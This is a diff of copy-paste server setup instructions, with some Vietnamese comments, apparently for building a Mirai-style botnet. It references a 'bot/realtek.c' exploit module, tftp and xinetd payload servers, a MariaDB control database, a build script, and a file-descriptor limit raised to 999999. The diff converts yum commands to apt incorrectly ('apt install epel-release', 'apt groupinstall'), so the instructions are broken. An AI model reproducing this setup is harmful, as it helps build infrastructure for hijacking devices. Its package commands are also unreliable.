@@ -1,11 +1,11 @@
 // Copy paste this code and put it all on your terminal all at once:
 
-yum update -y
-yum install epel-release -y
-yum groupinstall "Development Tools" -y
-yum install gmp-devel -y
+sudo apt update -y
+sudo apt install epel-release -y
+sudo apt groupinstall "Development Tools" -y
+sudo apt install gmp-devel -y
 ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
-yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+sudo apt install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
 
 cd /tmp
 wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
@@ -74,7 +74,7 @@ bot/realtek.c
 
 // We will setup the database, run these commands on your terminal:
 
-yum install mariadb-server -y
+sudo apt install mariadb-server -y
 service mariadb restart
 
 // Thay đổi password mysql
@@ -135,7 +135,7 @@ service mariadb restart
 
 cd ~/
 chmod 777 *
-sh build.sh
+bash build.sh
 
 nano /usr/include/bits/typesizes.h
 scroll down and edit the 1024 to 999999
